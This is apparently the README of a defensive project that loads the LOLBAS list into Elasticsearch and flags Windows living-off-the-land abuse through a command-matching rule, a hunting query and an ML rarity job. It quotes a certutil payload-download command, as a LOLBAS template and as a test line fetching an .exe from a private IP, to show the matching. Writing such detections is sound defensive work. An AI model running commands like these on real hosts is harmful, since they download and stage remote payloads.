# LOLBAS Detection for Elastic

Detects living-off-the-land (LOTL) activity on Windows hosts in Elastic, using the
[LOLBAS project](https://lolbas-project.github.io/) as the source of truth.

It has four parts. The rule, hunting query and ML job each need the list sync, and nothing else:

| Part | What it does | Raises alerts? |
|---|---|---|
| **List sync** (`lolbas_sync.py`) | Downloads the LOLBAS list and loads it into two Elasticsearch lookup indices | No |
| **Command rule** (`rules/`) | Alerts when a LOLBAS binary starts with a command line that matches a known LOLBAS attack command | Yes |
| **Hunting query** (`queries/hunt_lolbas_binaries.esql`) | Shows which LOLBAS binaries ran, and on how few hosts | No |
| **ML job** (`lolbas_ml.py`) | One anomaly detection job: a LOLBAS binary that is rare for that host | Anomalies only |

## Requirements

- Python 3.6 or later on the host that runs the scripts. No packages to install.
- Network access from that host to the production Elasticsearch endpoint, and to
  `lolbas-project.github.io` (or copy the JSON file over by hand, see step 4).
- Elastic Stack 9.1 or later (the rule and queries use ES|QL `LOOKUP JOIN`).
- A license that includes machine learning, for the ML job only.
- Process-start events with `process.name` and `process.command_line` (ECS fields)
  from Elastic Defend, CrowdStrike or Microsoft Defender.

## Files

```
config.env.example                  settings (copy to config.env)
lolbas_common.py                    shared helper: config and HTTP calls
lolbas_sync.py                      download LOLBAS, load the lookup indices
lolbas_ml.py                        create or update the ML job
rules/lolbas_command_match.esql     the rule query, readable, with comments
rules/lolbas_command_match.rule.json the same rule, ready to paste into Dev Tools
queries/check_log_sources.esql      step 1: do your logs have the needed fields?
queries/hunt_lolbas_binaries.esql   hunting: which LOLBAS binaries ran
```

## Setup

### 1. Check your log sources

Run `queries/check_log_sources.esql` in Discover (ES|QL mode). Each data source
you expect must appear, with `with_name` and `with_command_line` close to `events`.

The index patterns in this project are defaults:
`logs-endpoint.events.process-*`, `logs-crowdstrike.fdr-*`, `logs-m365_defender.event-*`.
If yours differ, change them in four places: `config.env`, both files in `queries/`,
and both files in `rules/`.

### 2. Create an API key (production Kibana > Dev Tools)

```
POST /_security/api_key
{
  "name": "lolbas-sync",
  "role_descriptors": {
    "lolbas_sync": {
      "cluster": ["manage_ml"],
      "indices": [
        { "names": ["lolbas-*"], "privileges": ["all"] },
        { "names": ["logs-endpoint.events.process-*", "logs-crowdstrike.fdr-*", "logs-m365_defender.event-*"],
          "privileges": ["read", "view_index_metadata"] }
      ]
    }
  }
}
```

- `lolbas-*`: the scripts create and fill these two indices.
- `manage_ml` and read access to the log indices: only needed for the ML job. The
  datafeed keeps running with this key, so the key has no expiration. Delete the key
  when you retire this project.

### 3. Configure

```bash
cp config.env.example config.env
```

```bash
chmod 600 config.env
```

Edit `config.env`: set `ES_URL` and `ES_API_KEY` (the `encoded` value from step 2).

### 4. Load the LOLBAS list

Look first, change nothing:

```bash
python3 lolbas_sync.py --dry-run | less
```

Then load it:

```bash
python3 lolbas_sync.py
```

If the host cannot reach `lolbas-project.github.io`, download
`https://lolbas-project.github.io/api/lolbas.json` on another machine, copy it over, and run
`python3 lolbas_sync.py --file lolbas.json`.

### 5. Create the detection rule (production Kibana > Dev Tools)

Type `POST kbn:/api/detection_engine/rules` on one line, then paste the whole content of
`rules/lolbas_command_match.rule.json` below it, and run it.

The rule is created **disabled**. Open it under Security > Rules, use the rule preview
on the last 24 hours to see the alert volume, add exceptions, then enable it.

### 6. Create the ML job (optional)

```bash
python3 lolbas_ml.py
```

Check on it at any time:

```bash
python3 lolbas_ml.py --status
```

### 7. Schedule it

Once a day is enough; the LOLBAS list changes a few times a month.

```
15 6 * * * cd /opt/lolbas_elastic_detection && python3 lolbas_sync.py >> sync.log 2>&1 && python3 lolbas_ml.py >> sync.log 2>&1
```

## How the command matching works

LOLBAS documents commands such as:

```
certutil.exe -urlcache -f {REMOTEURL:.exe} {PATH:.exe}
```

`lolbas_sync.py` turns each one into a binary name plus up to three keywords:

1. **Binary**: the program the command starts (`certutil.exe`). For a `.dll` or script
   entry it is the LOLBAS binary that runs it, for example `rundll32.exe`.
2. **Keywords**: the words of the command, lowercased, with these changes:
   - A leading `-` or `/` is removed, so `-urlcache` and `/urlcache` both match.
   - `{REMOTEURL}` becomes `http`. `{PATH_SMB}` becomes `\\`. An extension hint such as
     `{PATH:.sct}` becomes `.sct` (`.exe` is ignored, it is in every command line).
   - Other placeholders, example file paths, numbers and words shorter than 3 characters are dropped.
   - The three longest words are kept.
3. A command with no keyword left is **skipped**, because it cannot be told apart from
   normal use of the binary (for example `eventvwr.exe`). The dry run lists these.

The rule alerts when the binary name matches and **every** keyword is somewhere in the
command line. A command with only one keyword counts only if it loads a payload from a
URL or network share (`lolbas_remote`).

To see what a command line would match, without touching Elasticsearch:

```bash
python3 lolbas_sync.py --match 'certutil.exe -urlcache -f http://10.0.0.5/a.exe a.exe'
```

### Limits you should know about

- **False positives are expected.** Many LOLBAS commands are also normal administration,
  for example `msiexec /quiet /i app.msi` or opening Control Panel through `rundll32`.
  Use the rule preview and rule exceptions before you enable the rule.
- **Renamed binaries are not caught.** Matching is on `process.name`.
- **Keywords are literal.** An attacker who obfuscates the command line (carets, string
  concatenation, different flags) can avoid a match. The ML job and the hunting query
  cover part of that gap.
- 81 of the 485 LOLBAS commands are skipped today because they have no usable keyword.

## How the ML job works

- Job: `lolbas_rare_binary_by_host`. Detector: `rare` by `process.name`, partitioned by `host.name`.
  It flags a LOLBAS binary that a host has not, or has rarely, run before.
- The datafeed reads only process-start events of LOLBAS binaries. `lolbas_ml.py` writes
  the binary names into the datafeed query, and rewrites it when the list changes.
- The datafeed query excludes the warm, cold and frozen tiers. If the datafeed ever falls
  behind, it does not read old data from those tiers.
- A datafeed that someone stopped by hand stays stopped; the script does not restart it.
- View results in Kibana under Machine Learning > Anomaly Explorer. The job needs about two
  weeks of data before its results are reliable.

## Troubleshooting

| Symptom | Cause and fix |
|---|---|
| `ERROR: ES_URL is not set` | `config.env` is missing or not in the same folder as the scripts. |
| `returned HTTP 401` | Wrong API key, or the key belongs to a different deployment than `ES_URL`. |
| `returned HTTP 403` | The API key lacks a privilege. Compare it with step 2. |
| `cannot reach ...` | Network or proxy problem between this host and the URL shown. |
| Download fails | The host cannot reach `lolbas-project.github.io`. Use `--file` (step 4). |
| Rule fails with "Unknown index [lolbas-commands]" | Run `lolbas_sync.py` first. |
| Rule fails with "Unknown column" | That field does not exist in any index of the pattern. Run `queries/check_log_sources.esql`. |
| Rule or hunt query fails on `LOOKUP JOIN` | The stack is older than 9.1, or the lookup index was created by hand without `index.mode: lookup`. Delete both `lolbas-*` indices and run `lolbas_sync.py` again. |
| Rule runs but never alerts | Run `queries/check_log_sources.esql`. If counts are 0, `event.category` or `event.type` hold different values in your data. Then test a known command with `--match`. |
| Too many alerts | Add rule exceptions, or change `>= 2` to `>= 3` in the rule query. |
| ML job shows `hard_limit` | Raise `ML_MEMORY_LIMIT`. Close the job, update its `model_memory_limit`, open it again. |
| ML `minutes behind` keeps growing | The datafeed cannot keep up. Stop it and start it again with `{"start": "now-1h"}`. |

## Remove everything

```
POST _ml/datafeeds/datafeed-lolbas_rare_binary_by_host/_stop
POST _ml/anomaly_detectors/lolbas_rare_binary_by_host/_close
DELETE _ml/datafeeds/datafeed-lolbas_rare_binary_by_host
DELETE _ml/anomaly_detectors/lolbas_rare_binary_by_host
DELETE lolbas-binaries,lolbas-commands
DELETE /_security/api_key
{ "name": "lolbas-sync" }
```

Delete the rule under Security > Rules.

---

Only the readme and documentation was generated with AI.
